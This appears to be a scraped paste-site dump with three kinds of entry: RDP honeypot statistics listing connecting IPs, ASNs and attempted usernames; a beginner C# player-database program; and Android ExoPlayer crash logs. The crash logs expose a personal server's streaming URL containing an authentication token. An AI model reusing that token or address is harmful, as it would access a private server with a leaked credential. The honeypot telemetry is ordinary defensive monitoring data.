    ""AS51167"": 3,
    ""AS20115"": 63,
    ""AS204428"": 96,
    ""AS396982"": 36,
    ""AS4826"": 24,
    ""AS7018"": 6,
    ""AS6128"": 6,
    ""AS4766"": 9,
    ""AS138192"": 6,
    ""AS201814"": 3,
    ""AS29465"": 3,
    ""AS26277"": 3,
    ""AS212238"": 3,
    ""AS208046"": 3,
    ""AS135377"": 3,
    ""AS202425"": 3,
    ""AS48721"": 6,
    ""AS398324"": 3,
    ""AS210848"": 6
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 23283,
    ""CloudHosting Data Center"": 1308,
    ""Flyservers S.A."": 18,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""OPTAGE Inc."": 3,
    ""Contabo GmbH"": 3,
    ""Charter Communications"": 63,
    ""SS-Net"": 96,
    ""Google LLC"": 36,
    ""Vocus PTY LTD"": 24,
    ""AT&T Enterprises, LLC"": 6,
    ""Cablevision Systems Corp."": 6,
    ""Korea Telecom"": 9,
    ""Speed"": 6,
    ""MEVSPACE sp. z o.o."": 3,
    ""MTN NIGERIA Communication limited"": 3,
    ""Las Vegas NV Datacenter"": 3,
    ""Datacamp Limited"": 3,
    ""ColocationX Ltd."": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""IP Volume inc"": 3,
    ""Censys, Inc."": 3,
    ""DIGITALOCEAN"": 3,
    ""Telkom Internet LTD"": 6
  },
  ""org"": {
    ""Digital Ocean"": 1821,
    ""DigitalOcean, LLC"": 21465,
    ""CloudHosting SIA"": 1308,
    ""Xwin Universal LTD"": 12,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""OPTAGE Inc."": 3,
    ""Contabo GmbH"": 3,
    ""Spectrum"": 63,
    ""Unmanaged LTD"": 96,
    ""Palo Alto Networks, Inc"": 36,
    ""Vocus Communications"": 24,
    ""PPPoX Pool - rback4.spfdmo"": 6,
    ""Optimum Online (Cablevision Systems)"": 6,
    ""Kornet"": 9,
    ""Unknown"": 6,
    ""HostSlick"": 3,
    ""MTN Nigeria"": 3,
    ""ServerPoint.com"": 3,
    ""Datacamp Limited"": 3,
    ""ColocationX Ltd"": 3,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""AI Spera"": 3,
    ""Flyservers S.A"": 6,
    ""Censys Inc"": 3,
    ""Korotkij Denis Aleksandrovich"": 6
  },
  ""regionName"": {
    ""New Jersey"": 1827,
    ""South West"": 11226,
    ""Ontario"": 10236,
    ""R\u012bga"": 1308,
    ""Vilnius"": 12,
    ""Kowloon City"": 6,
    ""Osaka"": 3,
    ""Bavaria"": 6,
    ""Wisconsin"": 63,
    ""Budapest"": 96,
    ""California"": 36,
    ""Western Australia"": 24,
    ""Alabama"": 6,
    ""Karnataka"": 3,
    ""Sejong-si"": 9,
    ""Dhaka Division"": 6,
    ""Lagos"": 3,
    ""Nevada"": 3,
    ""North Holland"": 15,
    ""Hesse"": 3,
    ""Kaunas"": 6,
    ""Michigan"": 3
  },
  ""country"": {
    ""United States"": 1938,
    ""Singapore"": 11226,
    ""Canada"": 10236,
    ""Latvia"": 1308,
    ""Lithuania"": 18,
    ""Hong Kong"": 6,
    ""Japan"": 3,
    ""Germany"": 9,
    ""Hungary"": 96,
    ""Australia"": 24,
    ""India"": 3,
    ""South Korea"": 9,
    ""Bangladesh"": 6,
    ""Nigeria"": 3,
    ""The Netherlands"": 15
  },
  ""account"": {
    ""hello"": 24615,
    ""Test"": 36,
    ""142.93.8.59"": 171,
    ""iUheFxgPz"": 3,
    ""llnWoG"": 3,
    ""bivKTP"": 3,
    ""Administr"": 33,
    ""ikuPcmogy"": 3,
    ""KZfBON"": 3,
    ""OwprSU"": 3,
    ""nsmFqhOat"": 3,
    ""mIBnpl"": 3,
    ""NmscdV"": 3,
    ""Administrator"": 3,
    ""nmap"": 3,
    ""(empty)"": 3,
    ""LkyzmQMGk"": 3,
    ""ZVhLFz"": 3,
    ""ejbPSR"": 3
  },
  ""keyboard"": {
    ""Unknown"": 24900
  },
  ""client_build"": {
    ""Unknown"": 24900
  },
  ""client_name"": {
    ""Unknown"": 24900
  },
  ""ip_type"": {
    ""hosting"": 14403,
    ""hosting & proxy"": 10239,
    ""Unknown"": 255,
    ""mobile & hosting"": 3
  }
}"
gTezR764,2025-05-12_stats.json,rdp_snitch,JSON,Tuesday 13th of May 2025 07:16:12 PM CDT,"{
  ""ip"": {
    ""174.138.67.202"": 1819,
    ""157.245.150.219"": 3594,
    ""128.199.168.88"": 3816,
    ""128.199.166.57"": 3513,
    ""146.190.242.181"": 10236,
    ""185.8.62.6"": 1308,
    ""209.97.169.106"": 300,
    ""45.227.254.151"": 6,
    ""88.214.25.124"": 6,
    ""128.22.147.233"": 3,
    ""167.86.85.195"": 3,
    ""71.82.170.60"": 63,
    ""80.94.95.198"": 66,
    ""205.210.31.71"": 9,
    ""123.103.219.70"": 24,
    ""80.94.95.203"": 30,
    ""75.34.67.3"": 6,
    ""157.245.104.150"": 3,
    ""174.44.14.56"": 6,
    ""211.185.207.14"": 9,
    ""103.129.215.14"": 6,
    ""198.235.24.178"": 9,
    ""194.180.49.123"": 3,
    ""102.88.21.217"": 3,
    ""216.108.237.6"": 3,
    ""149.34.244.183"": 3,
    ""205.210.31.236"": 9,
    ""78.142.18.92"": 3,
    ""165.154.138.33"": 3,
    ""45.227.254.156"": 6,
    ""185.242.226.23"": 3,
    ""194.165.16.161"": 6,
    ""162.142.125.37"": 3,
    ""139.59.108.120"": 3,
    ""198.235.24.68"": 9,
    ""92.63.197.197"": 6
  },
  ""asn"": {
    ""AS14061"": 23284,
    ""AS58269"": 1308,
    ""AS267784"": 12,
    ""AS35042"": 6,
    ""AS17511"": 3,
    ""AS51167"": 3,
    ""AS20115"": 63,
    ""AS204428"": 96,
    ""AS396982"": 36,
    ""AS4826"": 24,
    ""AS7018"": 6,
    ""AS6128"": 6,
    ""AS4766"": 9,
    ""AS138192"": 6,
    ""AS201814"": 3,
    ""AS29465"": 3,
    ""AS26277"": 3,
    ""AS212238"": 3,
    ""AS208046"": 3,
    ""AS135377"": 3,
    ""AS202425"": 3,
    ""AS48721"": 6,
    ""AS398324"": 3,
    ""AS210848"": 6
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 23281,
    ""CloudHosting Data Center"": 1308,
    ""Flyservers S.A."": 18,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""OPTAGE Inc."": 3,
    ""Contabo GmbH"": 3,
    ""Charter Communications"": 63,
    ""SS-Net"": 96,
    ""Google LLC"": 36,
    ""Vocus PTY LTD"": 24,
    ""AT&T Enterprises, LLC"": 6,
    ""Cablevision Systems Corp."": 6,
    ""Korea Telecom"": 9,
    ""Speed"": 6,
    ""MEVSPACE sp. z o.o."": 3,
    ""MTN NIGERIA Communication limited"": 3,
    ""Las Vegas NV Datacenter"": 3,
    ""Datacamp Limited"": 3,
    ""ColocationX Ltd."": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""IP Volume inc"": 3,
    ""Censys, Inc."": 3,
    ""DIGITALOCEAN"": 3,
    ""Telkom Internet LTD"": 6
  },
  ""org"": {
    ""Digital Ocean"": 1819,
    ""DigitalOcean, LLC"": 21465,
    ""CloudHosting SIA"": 1308,
    ""Xwin Universal LTD"": 12,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""OPTAGE Inc."": 3,
    ""Contabo GmbH"": 3,
    ""Spectrum"": 63,
    ""Unmanaged LTD"": 96,
    ""Palo Alto Networks, Inc"": 36,
    ""Vocus Communications"": 24,
    ""PPPoX Pool - rback4.spfdmo"": 6,
    ""Optimum Online (Cablevision Systems)"": 6,
    ""Kornet"": 9,
    ""Unknown"": 6,
    ""HostSlick"": 3,
    ""MTN Nigeria"": 3,
    ""ServerPoint.com"": 3,
    ""Datacamp Limited"": 3,
    ""ColocationX Ltd"": 3,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""AI Spera"": 3,
    ""Flyservers S.A"": 6,
    ""Censys Inc"": 3,
    ""Korotkij Denis Aleksandrovich"": 6
  },
  ""regionName"": {
    ""New Jersey"": 1825,
    ""South West"": 11226,
    ""Ontario"": 10236,
    ""R\u012bga"": 1308,
    ""Vilnius"": 12,
    ""Kowloon City"": 6,
    ""Osaka"": 3,
    ""Bavaria"": 6,
    ""Wisconsin"": 63,
    ""Budapest"": 96,
    ""California"": 36,
    ""Western Australia"": 24,
    ""Alabama"": 6,
    ""Karnataka"": 3,
    ""Sejong-si"": 9,
    ""Dhaka Division"": 6,
    ""Lagos"": 3,
    ""Nevada"": 3,
    ""North Holland"": 15,
    ""Hesse"": 3,
    ""Kaunas"": 6,
    ""Michigan"": 3
  },
  ""country"": {
    ""United States"": 1936,
    ""Singapore"": 11226,
    ""Canada"": 10236,
    ""Latvia"": 1308,
    ""Lithuania"": 18,
    ""Hong Kong"": 6,
    ""Japan"": 3,
    ""Germany"": 9,
    ""Hungary"": 96,
    ""Australia"": 24,
    ""India"": 3,
    ""South Korea"": 9,
    ""Bangladesh"": 6,
    ""Nigeria"": 3,
    ""The Netherlands"": 15
  },
  ""account"": {
    ""hello"": 24613,
    ""Test"": 36,
    ""142.93.8.59"": 171,
    ""iUheFxgPz"": 3,
    ""llnWoG"": 3,
    ""bivKTP"": 3,
    ""Administr"": 33,
    ""ikuPcmogy"": 3,
    ""KZfBON"": 3,
    ""OwprSU"": 3,
    ""nsmFqhOat"": 3,
    ""mIBnpl"": 3,
    ""NmscdV"": 3,
    ""Administrator"": 3,
    ""nmap"": 3,
    ""(empty)"": 3,
    ""LkyzmQMGk"": 3,
    ""ZVhLFz"": 3,
    ""ejbPSR"": 3
  },
  ""keyboard"": {
    ""Unknown"": 24898
  },
  ""client_build"": {
    ""Unknown"": 24898
  },
  ""client_name"": {
    ""Unknown"": 24898
  },
  ""ip_type"": {
    ""hosting"": 14401,
    ""hosting & proxy"": 10239,
    ""Unknown"": 255,
    ""mobile & hosting"": 3
  }
}"
XW5TTCuS,2025-05-12_stats.json,rdp_snitch,JSON,Tuesday 13th of May 2025 07:15:10 PM CDT,"{
  ""ip"": {
    ""174.138.67.202"": 1817,
    ""157.245.150.219"": 3594,
    ""128.199.168.88"": 3816,
    ""128.199.166.57"": 3513,
    ""146.190.242.181"": 10236,
    ""185.8.62.6"": 1308,
    ""209.97.169.106"": 300,
    ""45.227.254.151"": 6,
    ""88.214.25.124"": 6,
    ""128.22.147.233"": 3,
    ""167.86.85.195"": 3,
    ""71.82.170.60"": 63,
    ""80.94.95.198"": 66,
    ""205.210.31.71"": 9,
    ""123.103.219.70"": 24,
    ""80.94.95.203"": 30,
    ""75.34.67.3"": 6,
    ""157.245.104.150"": 3,
    ""174.44.14.56"": 6,
    ""211.185.207.14"": 9,
    ""103.129.215.14"": 6,
    ""198.235.24.178"": 9,
    ""194.180.49.123"": 3,
    ""102.88.21.217"": 3,
    ""216.108.237.6"": 3,
    ""149.34.244.183"": 3,
    ""205.210.31.236"": 9,
    ""78.142.18.92"": 3,
    ""165.154.138.33"": 3,
    ""45.227.254.156"": 6,
    ""185.242.226.23"": 3,
    ""194.165.16.161"": 6,
    ""162.142.125.37"": 3,
    ""139.59.108.120"": 3,
    ""198.235.24.68"": 9,
    ""92.63.197.197"": 6
  },
  ""asn"": {
    ""AS14061"": 23282,
    ""AS58269"": 1308,
    ""AS267784"": 12,
    ""AS35042"": 6,
    ""AS17511"": 3,
    ""AS51167"": 3,
    ""AS20115"": 63,
    ""AS204428"": 96,
    ""AS396982"": 36,
    ""AS4826"": 24,
    ""AS7018"": 6,
    ""AS6128"": 6,
    ""AS4766"": 9,
    ""AS138192"": 6,
    ""AS201814"": 3,
    ""AS29465"": 3,
    ""AS26277"": 3,
    ""AS212238"": 3,
    ""AS208046"": 3,
    ""AS135377"": 3,
    ""AS202425"": 3,
    ""AS48721"": 6,
    ""AS398324"": 3,
    ""AS210848"": 6
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 23279,
    ""CloudHosting Data Center"": 1308,
    ""Flyservers S.A."": 18,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""OPTAGE Inc."": 3,
    ""Contabo GmbH"": 3,
    ""Charter Communications"": 63,
    ""SS-Net"": 96,
    ""Google LLC"": 36,
    ""Vocus PTY LTD"": 24,
    ""AT&T Enterprises, LLC"": 6,
    ""Cablevision Systems Corp."": 6,
    ""Korea Telecom"": 9,
    ""Speed"": 6,
    ""MEVSPACE sp. z o.o."": 3,
    ""MTN NIGERIA Communication limited"": 3,
    ""Las Vegas NV Datacenter"": 3,
    ""Datacamp Limited"": 3,
    ""ColocationX Ltd."": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""IP Volume inc"": 3,
    ""Censys, Inc."": 3,
    ""DIGITALOCEAN"": 3,
    ""Telkom Internet LTD"": 6
  },
  ""org"": {
    ""Digital Ocean"": 1817,
    ""DigitalOcean, LLC"": 21465,
    ""CloudHosting SIA"": 1308,
    ""Xwin Universal LTD"": 12,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""OPTAGE Inc."": 3,
    ""Contabo GmbH"": 3,
    ""Spectrum"": 63,
    ""Unmanaged LTD"": 96,
    ""Palo Alto Networks, Inc"": 36,
    ""Vocus Communications"": 24,
    ""PPPoX Pool - rback4.spfdmo"": 6,
    ""Optimum Online (Cablevision Systems)"": 6,
    ""Kornet"": 9,
    ""Unknown"": 6,
    ""HostSlick"": 3,
    ""MTN Nigeria"": 3,
    ""ServerPoint.com"": 3,
    ""Datacamp Limited"": 3,
    ""ColocationX Ltd"": 3,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""AI Spera"": 3,
    ""Flyservers S.A"": 6,
    ""Censys Inc"": 3,
    ""Korotkij Denis Aleksandrovich"": 6
  },
  ""regionName"": {
    ""New Jersey"": 1823,
    ""South West"": 11226,
    ""Ontario"": 10236,
    ""R\u012bga"": 1308,
    ""Vilnius"": 12,
    ""Kowloon City"": 6,
    ""Osaka"": 3,
    ""Bavaria"": 6,
    ""Wisconsin"": 63,
    ""Budapest"": 96,
    ""California"": 36,
    ""Western Australia"": 24,
    ""Alabama"": 6,
    ""Karnataka"": 3,
    ""Sejong-si"": 9,
    ""Dhaka Division"": 6,
    ""Lagos"": 3,
    ""Nevada"": 3,
    ""North Holland"": 15,
    ""Hesse"": 3,
    ""Kaunas"": 6,
    ""Michigan"": 3
  },
  ""country"": {
    ""United States"": 1934,
    ""Singapore"": 11226,
    ""Canada"": 10236,
    ""Latvia"": 1308,
    ""Lithuania"": 18,
    ""Hong Kong"": 6,
    ""Japan"": 3,
    ""Germany"": 9,
    ""Hungary"": 96,
    ""Australia"": 24,
    ""India"": 3,
    ""South Korea"": 9,
    ""Bangladesh"": 6,
    ""Nigeria"": 3,
    ""The Netherlands"": 15
  },
  ""account"": {
    ""hello"": 24611,
    ""Test"": 36,
    ""142.93.8.59"": 171,
    ""iUheFxgPz"": 3,
    ""llnWoG"": 3,
    ""bivKTP"": 3,
    ""Administr"": 33,
    ""ikuPcmogy"": 3,
    ""KZfBON"": 3,
    ""OwprSU"": 3,
    ""nsmFqhOat"": 3,
    ""mIBnpl"": 3,
    ""NmscdV"": 3,
    ""Administrator"": 3,
    ""nmap"": 3,
    ""(empty)"": 3,
    ""LkyzmQMGk"": 3,
    ""ZVhLFz"": 3,
    ""ejbPSR"": 3
  },
  ""keyboard"": {
    ""Unknown"": 24896
  },
  ""client_build"": {
    ""Unknown"": 24896
  },
  ""client_name"": {
    ""Unknown"": 24896
  },
  ""ip_type"": {
    ""hosting"": 14399,
    ""hosting & proxy"": 10239,
    ""Unknown"": 255,
    ""mobile & hosting"": 3
  }
}"
R9kZ4A0G,Untitled,Rodunskiy,C#,Tuesday 13th of May 2025 06:08:28 PM CDT,"namespace CSLight
{
    class Program
    {
        static void Main(string[] args)
        {
            const string AddPlayer = ""1"";
            const string BanPlayer = ""2"";
            const string UnbanPlayer = ""3"";
            const string DeletePlayer = ""4"";
            const string PrintAllPlayers = ""5"";
            const string ExitProgram = ""6"";

            Database database = new Database();

            bool isWorking = true; 

            while (isWorking)
            {
                Console.WriteLine($""{AddPlayer})Добавить игрока.\n{BanPlayer})Забанить игрока.\n{UnbanPlayer})Разбанить игрока.\n{DeletePlayer})Удалить игрока."" +
                                  $""\n{PrintAllPlayers})Вывести список всех игроков.\n{ExitProgram})Выход из программы."");
                string userInput = Console.ReadLine();

                switch (userInput)
                {
                    case AddPlayer:
                        database.AddPlayer();
                        break;

                    case BanPlayer:
                        database.BanPlayer();
                        break;

                    case UnbanPlayer:
                        database.UnbanPlayer();
                        break;

                    case DeletePlayer:
                        database.DeletePlayer();
                        break;

                    case PrintAllPlayers:
                        database.PrintAllPlayers();
                        break;

                    case ExitProgram:
                        isWorking = false;
                        break;

                    default:
                        Console.WriteLine(""Неверный выбор. Попробуйте еще раз."");
                        break;
                }
            }
        }
    }

    class Database
    {
        private Dictionary<int, Player> _players = new Dictionary<int, Player>();
        private int _nextId = 1;

        public void AddPlayer()
        {
            Console.WriteLine(""Введите ник игрока."");
            string nickname = Console.ReadLine();

            Console.WriteLine(""Введите уровень"");
            int level = Convert.ToInt32(Console.ReadLine());

            Player player = new Player(_nextId, nickname, level);

            _players.Add(_nextId, player);
            _nextId++;

            Console.WriteLine($""Игрок {nickname} добавлен с ID {player.Id}"");
        }

        public void BanPlayer()
        {
            Console.WriteLine(""Введите уникальный номер игрока которого хотите забанить."");
            int userInput = Convert.ToInt32(Console.ReadLine());

            if (_players.TryGetValue(userInput, out var player))
            {
                player.IsBanned = true;

                Console.WriteLine($""Игрок {player.Nickname} (ID: {userInput}) забанен."");
            }
            else
            {
                Console.WriteLine($""Игрок с ID {userInput} не найден."");
            }
        }

        public void UnbanPlayer()
        {
            Console.WriteLine(""Введите уникальный номер игрока которого хотите разбанить."");
            int userInput = Convert.ToInt32(Console.ReadLine());

            if (_players.TryGetValue(userInput, out var player))
            {
                player.IsBanned = false;

                Console.WriteLine($""Игрок {player.Nickname} (ID: {userInput}) разбанен."");
            }
            else
            {
                Console.WriteLine($""Игрок с ID {userInput} не найден."");
            }
        }

        public void DeletePlayer()
        {
            Console.WriteLine(""Введите уникальный номер игрока которого хотите удалить."");
            int userInput = Convert.ToInt32(Console.ReadLine());

            if (_players.Remove(userInput, out var player))
            {
                Console.WriteLine($""Игрок {player.Nickname} (ID: {userInput}) удален."");
            }
            else
            {
                Console.WriteLine($""Игрок с ID {userInput} не найден."");
            }
        }

        public void PrintAllPlayers()
        {
            if (_players.Count == 0)
            {
                Console.WriteLine(""В базе нет игроков."");
            }
            else
            {
                Console.WriteLine(""Список игроков:"");

                foreach (var player in _players.Values)
                {
                    player.ShowPlayer();
                }
            }
        }
    }

    class Player
    {
        public int Id { get; private set; }
        public string Nickname { get; private set; }
        public int Level { get; private set; }
        public bool IsBanned { get;  set; }

        public Player(int uniqueNumber, string nickname, int lvl, bool isBanned = false)
        {
            Id = uniqueNumber;
            Nickname = nickname;
            Level = lvl;
            IsBanned = isBanned;
        }

        public void ShowPlayer()
        {
            if (IsBanned == false)
            {
                Console.WriteLine($""ID: {Id} | Ник: {Nickname} | Уровень: {Level} | Статус: Активен"");
            }
            else
            {
                Console.WriteLine($""ID: {Id} | Ник: {Nickname} | Уровень: {Level} | Статус: Забанен"");
            }

        } 
    }
}"
SKbNX64S,2025-05-14T00:49:55.237618,powerampache,PHP,Tuesday 13th of May 2025 05:49:53 PM CDT,"1.01-80 (80) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:864)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:834)
	at android.os.Handler.dispatchMessage(Handler.java:105)
	at android.os.Looper.loopOnce(Looper.java:232)
	at android.os.Looper.loop(Looper.java:317)
	at android.os.HandlerThread.run(HandlerThread.java:85)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1124)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:453)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1156)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:651)
	at java.lang.Thread.run(Thread.java:1119)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":142},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mClassLoader"":{""packages"":{""android.security.net.config"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""android.security.net.config"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""com.android.org.conscrypt"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.org.conscrypt"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""}},""proxyCache"":{}},""mFlags"":3584,""mLazyValues"":0,""mMap"":{},""mOwnsLazyValues"":false,""mParcelledByNative"":false},""timestampMs"":217581908,""cause"":{""sniffFailures"":[{},{}],""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""index.php"",""apps"",""music"",""ampache"",""server"",""json.server.php""],""decoded"":""NOT CACHED"",""encoded"":""/index.php/apps/music/ampache/server/json.server.php""},""scheme"":""https"",""uriString"":""https://tigermick.hd.free.fr/index.php/apps/music/ampache/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d0a3a0b736f96afd99a19420a2543299e\u0026type\u003dsong\u0026id\u003d171950"",""host"":""NOT CACHED"",""port"":-2},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1124,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1156,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":651,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1119,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source error"",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":864,""methodName"":""handleIoException""},{""declaringClass"":""androidx.media3.exoplayer.ExoPlayerImplInternal"",""fileName"":""ExoPlayerImplInternal.java"",""lineNumber"":834,""methodName"":""handleMessage""},{""declaringClass"":""android.os.Handler"",""fileName"":""Handler.java"",""lineNumber"":105,""methodName"":""dispatchMessage""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":232,""methodName"":""loopOnce""},{""declaringClass"":""android.os.Looper"",""fileName"":""Looper.java"",""lineNumber"":317,""methodName"":""loop""},{""declaringClass"":""android.os.HandlerThread"",""fileName"":""HandlerThread.java"",""lineNumber"":85,""methodName"":""run""}],""suppressedExceptions"":[]}"
rv5brcJK,2025-05-14T00:49:54.606860,powerampache,PHP,Tuesday 13th of May 2025 05:49:53 PM CDT,"1.01-80 (80) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:864)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:834)
	at android.os.Handler.dispatchMessage(Handler.java:105)
	at android.os.Looper.loopOnce(Looper.java:232)
	at android.os.Looper.loop(Looper.java:317)
	at android.os.HandlerThread.run(HandlerThread.java:85)
Caused by: androidx.media3.exoplayer.source.UnrecognizedInputFormatException: None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream. {contentIsMalformed=false, dataType=1}
	at androidx.media3.exoplayer.source.BundledExtractorsAdapter.init(BundledExtractorsAdapter.java:108)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1124)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:453)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1156)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:651)
	at java.lang.Thread.run(Thread.java:1119)

onPlayerError PlaybackException - PlaybackException 

 {""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":142},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":3003,""extras"":{""mClassLoader"":{""packages"":{""android.security.net.config"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""android.security.net.config"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""},""com.android.org.conscrypt"":{""implTitle"":""Unknown"",""implVendor"":""Unknown"",""implVersion"":""0.0"",""pkgName"":""com.android.org.conscrypt"",""specTitle"":""Unknown"",""specVendor"":""Unknown"",""specVersion"":""0.0""}},""proxyCache"":{}},""mFlags"":3584,""mLazyValues"":0,""mMap"":{},""mOwnsLazyValues"":false,""mParcelledByNative"":false},""timestampMs"":217580088,""cause"":{""sniffFailures"":[{},{}],""uri"":{""cachedFsi"":-2,""cachedSsi"":5,""path"":{""pathSegments"":[""index.php"",""apps"",""music"",""ampache"",""server"",""json.server.php""],""decoded"":""NOT CACHED"",""encoded"":""/index.php/apps/music/ampache/server/json.server.php""},""scheme"":""https"",""uriString"":""https://tigermick.hd.free.fr/index.php/apps/music/ampache/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003d0a3a0b736f96afd99a19420a2543299e\u0026type\u003dsong\u0026id\u003d171950"",""host"":""NOT CACHED"",""port"":-2},""contentIsMalformed"":false,""dataType"":1,""detailMessage"":""None of the available extractors (FlvExtractor, FlacExtractor, WavExtractor, FragmentedMp4Extractor, Mp4Extractor, AmrExtractor, PsExtractor, OggExtractor, TsExtractor, MatroskaExtractor, AdtsExtractor, Ac3Extractor, Ac4Extractor, Mp3Extractor, AviExtractor, JpegExtractor, PngExtractor, WebpExtractor, BmpExtractor, HeifExtractor, AvifExtractor) could read the stream."",""stackTrace"":[{""declaringClass"":""androidx.media3.exoplayer.source.BundledExtractorsAdapter"",""fileName"":""BundledExtractorsAdapter.java"",""lineNumber"":108,""methodName"":""init""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1124,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1156,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":651,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1119,""methodName"":""run""}],""suppressedExceptions"":[]},""detailMessage"":""Source 